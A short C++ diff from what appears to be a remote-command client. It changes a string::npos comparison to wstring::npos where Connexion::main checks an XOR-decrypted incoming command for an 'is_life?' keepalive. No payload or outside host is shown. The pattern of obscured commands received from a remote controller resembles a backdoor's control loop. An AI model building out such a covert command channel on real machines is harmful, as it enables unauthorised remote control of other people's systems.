@@ -62,7 +62,7 @@ int Connexion::main()
 
         command = recvSafe(); //Recv safe and decrypt xor
         
-        if(command.find(L"is_life?") != string::npos)
+        if(command.find(L"is_life?") != wstring::npos)
         {
             ;
             //if find is_life then continue
